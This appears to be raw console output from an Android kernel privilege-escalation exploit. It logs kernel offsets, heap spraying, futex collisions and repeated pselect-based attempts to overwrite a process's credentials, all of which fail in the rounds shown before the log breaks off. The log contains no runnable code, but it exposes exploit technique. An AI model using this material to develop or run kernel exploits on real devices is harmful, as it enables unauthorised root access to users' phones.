[33m[*] [0mkernel: 5.15.180-android13-8-00018-g9b2308ac0ad6-ab14563692
[32m[+] [0moffsets matched: 5.15.180-android13-8-00018-g9b2308ac0ad6-ab14563692 (layout nevada-5.15)
[32m[+] [0mstartup context pid=10732 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=0
[32m[+] [0mstartup limits pid=10732 NoNewPrivs=0 Seccomp=0 Seccomp_filters=0
[32m[+] [0mbuild config pid=10732 label=ghostlock_nevada slide=pselect main=pselect
[32m[+] [0mp0 profile pid=10732 phys_offset=0000000040000000 kernel_phys_load=0000000040000000 delta=0000000000000000 slide_logger=ffffff8002b01e28 bootid_data=ffffff8002dc6819 init_task=ffffff8002c43640 root_tg=ffffff8002d58ac0 sysctl_bootid=ffffff8002dc6819
[33m[*] [0m[T+0ms] exploit start
[32m[+] [0mSELinux already off
[33m[*] [0m[T+4009ms] pre-W2 drain
[33m[*] [0mperf task: 0xffffff8018903600 (51/256 votes)
[33m[*] [0m[T+4218ms] perf_find_task done
[33m[*] [0mchild_pid=12735 child_task=0xffffff8018903600
[33m[*] [0mround 1/10: cred write
[33m[*] [0m=== W2: cred === target=0xffffff8018903d98 mode=2
[33m[*] [0m[T+8210ms]   heap spray start
[33m[*] [0mfutex_hashsize 2048 (8 possible CPUs)
[33m[*] [0mks collisions=3/3 baseline=4 threshold=10x (40) accepted=[13291..13552] slowest_rejected=5
[33m[*] [0mprepare_kernel_page ok attempt=1
[33m[*] [0m[T+26179ms]   heap spray done
[33m[*] [0mpselect route setup attempt=1 simple=0 shift=-2 page=ffffff80d10b0000 fake_lock=ffffff80d10b0000 fake_w0=ffffff80d10b0300 fake_task=ffffff80d10b0400 in0=0000000000000000 in3=0000000000000000 out0=0000000000000000 ex0=0000000000000000 ex1=0000000000000000 ex2=0000000000000000 ex3=0000000000000000
[33m[*] [0mpselect pre-select +0ms
[33m[*] [0mpselect post-select +201ms ret=0
[33m[*] [0mpselect returned attempt=1 ret=0 errno=0 calls=1 success=0 delay=0
[33m[*] [0mpselect route done calls=1 success=0 step=33 errno=0
[33m[*] [0m[T+27413ms]   PI route done
[33m[*] [0mchild uid = 2000
[33m[*] [0mround 2/10: cred write
[33m[*] [0m=== W2: cred === target=0xffffff8018903d98 mode=2
[33m[*] [0m[T+37508ms]   heap spray start
[33m[*] [0mfutex_hashsize 2048 (8 possible CPUs)
[33m[*] [0mks collisions=3/3 baseline=4 threshold=10x (40) accepted=[14948..15593] slowest_rejected=5
[33m[*] [0mprepare_kernel_page ok attempt=1
[33m[*] [0m[T+46526ms]   heap spray done
[33m[*] [0mpselect route setup attempt=1 simple=0 shift=-2 page=ffffff80d2130000 fake_lock=ffffff80d2130000 fake_w0=ffffff80d2130300 fake_task=ffffff80d2130400 in0=0000000000000000 in3=0000000000000000 out0=0000000000000000 ex0=0000000000000000 ex1=0000000000000000 ex2=0000000000000000 ex3=0000000000000000
[33m[*] [0mpselect pre-select +0ms
[33m[*] [0mpselect post-select +201ms ret=0
[33m[*] [0mpselect returned attempt=1 ret=0 errno=0 calls=1 success=0 delay=0
[33m[*] [0mpselect route done calls=1 success=0 step=33 errno=0
[33m[*] [0m[T+47732ms]   PI route done
[33m[*] [0mchild uid = 2000
[33m[*] [0mround 3/10: cred write
[33m[*] [0m=== W2: cred === target=0xffffff8018903d98 mode=2
[33m[*] [0m[T+54011ms]   heap spray start
[33m[*] [0mfutex_hashsize 2048 (8 possible CPUs)
[33m[*] [0mks collisions=3/3 baseline=4 threshold=10x (40) accepted=[15195..16038] slowest_rejected=5
[33m[*] [0mprepare_kernel_page ok attempt=1
[33m[*] [0m[T+61369ms]   heap spray done
[33m[*] [0mpselect route setup attempt=1 simple=0 shift=-2 page=ffffff800fa08000 fake_lock=ffffff800fa08000 fake_w0=ffffff800fa08300 fake_task=ffffff800fa08400 in0=0000000000000000 in3=0000000000000000 out0=0000000000000000 ex0=0000000000000000 ex1=0000000000000000 ex2=0000000000000000 ex3=0000000000000000
[33m[*] [0mpselect pre-select +0ms
[33m[*] [0mpselect post-select +201ms ret=0
[33m[*] [0mpselect returned attempt=1 ret=0 errno=0 calls=1 success=0 delay=0
[33m[*] [0mpselect route done calls=1 success=0 step=33 errno=0
[33m[*] [0m[T+62574ms]   PI route done
[33m[*] [0mchild uid = 2000
[33m[*] [0mround 4/10: cred write
[33m[*] [0m=== W2: cred === target=0xffffff8018903d98 mode=2
[33m[*] [0m[T+69570ms]   heap spray start
[33m[*] [0mfutex_hashsize 2048 (8 possible CPUs)
[33m[*] [0mks collisions=3/3 baseline=4 threshold=10x (40) accepted=[15324..15961] slowest_rejected=5
[33m[*] [0mprepare_kernel_page ok attempt=1
[33m[*] [0m[T+77190ms]   heap spray done
[33m[*] [0mpselect route setup attempt=1 simple=0 shift=-2 page=ffffff800f018000 fake_lock=ffffff800f018000 fake_w0=ffffff800f018300 fake_task=ffffff800f018400 in0=0000000000000000 in3=0000000000000000 out0=0000000000000000 ex0=0000000000000000 ex1=0000000000000000 ex2=0000000000000000 ex3=0000000000000000
[33m[*] [0mpselect pre-select +0ms
[33m[*] [0mpselect post-select +204ms ret=0
[33m[*] [0mpselect returned attempt=1 ret=0 errno=0 calls=1 success=0 delay=0
[33m[*] [0mpselect route done calls=1 success=0 step=33 errno=0
[33m[*] [0m[T+78403ms]   PI route done
[33m[*] [0mchild uid = 2000
[33m[*] [0mround 5/10: cred write
[33m[*] [0m=== W2: cred === target=0xffffff8018903d98 mode=2
[33m[*] [0m[T+87845ms]   heap spray start
[33m[*] [0mfutex_hashsize 2048 (8 possible CPUs)
[33m[*] [0mks collisions=3/3 baseline=4 threshold=10x (40) accepted=[15213..16253] slowest_rejected=5
[33m[*] [0mprepare_kernel_page ok attempt=1
[33m[*] [0m[T+99317ms]   heap spray done
[33m[*] [0mpselect route setup attempt=1 simple=0 shift=-2 page=ffffff801f8d8000 fake_lock=ffffff801f8d8000 fake_w0=ffffff801f8d8300 fake_task=ffffff801f8d8400 in0=0000000000000000 in3=0000000000000000 out0=0000000000000000 ex0=0000000000000000 ex1=0000000000000000 ex2=0000000000000000 ex3=0000000000000000
[33m[*] [0mpselect pre-select +0ms
[33m[*] [0mpselect post-select +201ms ret=0
[33m[*] [0mpselect returned attempt=1 ret=0 errno=0 calls=1 success=0 delay=0
[33m[*] [0mpselect route done calls=1 success=0 step=33 errno=0
[33m[*] [0m[T+100524ms]   PI route done
[33m[*] [0mchild uid = 2000
[33m[*] [0mround 6/10: cred write
[33m[*] [0m=== W2: cred === target=0xffffff8018903d98 mode=2
[33m[*] [0m[T+110189ms]   heap spray start
[33m[*] [0mfutex_hashsize 2048 (8 possible CPUs)
[33m[*] [0mks collisions=3/3 baseline=4 threshold=10x (40) accepted=[16440..19004] slowest_rejected=5
[33m[*] [0mprepare_kernel_page ok attempt=1
[33m[*] [0m[T+120417ms]   heap spray done
[33m[*] [0mpselect route setup attempt=1 simple=0 shift=-2 page=ffffff8015888000 fake_lock=ffffff8015888000 fake_w0=ffffff8015888300 fake_task=ffffff8015888400 in0=0000000000000000 in3=0000000000000000 out0=0000000000000000 ex0=0000000000000000 ex1=0000000000000000 ex2=0000000000000000 ex3=0000000000000000
[33m[*] [0mpselect pre-select +0ms
[33m[*] [0mpselect post-select +201ms ret=0
[33m[*] [0mpselect returned attempt=1 ret=0 errno=0 calls=1 success=0 delay=0
[33m[*] [0mpselect route done calls=1 success=0 step=33 errno=0
[33m[*] [0m[T+121623ms]   PI route done
[33m[*] [0mchild uid = 2000
[33m[*] [0mround 7/10: cred write
[33m[*] [0m=== W2: cred === target=0xffffff8018903d98 mode=2
[33m[*] [0m[T+131631ms]   heap spray start
[33m[*] [0mfutex_hashsize 2048 (8 possible CPUs)
[33m[*] [0mks collisions=3/3 baseline=4 threshold=10x (40) accepted=[15547..15742] slowest_rejected=5
[33m[*] [0mprepare_kernel_page ok attempt=1
[33m[*] [0m[T+141745ms]   heap spray done
[33m[*] [0mpselect route setup attempt=1 simple=0 shift=-2 page=ffffff800d970000 fake_lock=ffffff800d970000 fake_w0=ffffff800d970300 fake_task=ffffff800d970400 in0=0000000000000000 in3=0000000000000000 out0=0000000000000000 ex0=0000000000000000 ex1=0000000000000000 ex2=0000000000000000 ex3=0000000000000000
[33m[*] [0mpselect pre-select +0ms
[33m[*] [0mpselect post-select +201ms ret=0
[33m[*] [0mpselect returned attempt=1 ret=0 errno=0 calls=1 success=0 delay=0
[33m[*] [0mpselect route done calls=1 success=0 step=33 errno=0
[33m[*] [0m[T+142952ms]   PI route done
[33m[*] [0mchild uid = 2000
[33m[*] [0mround 8/10: cred write
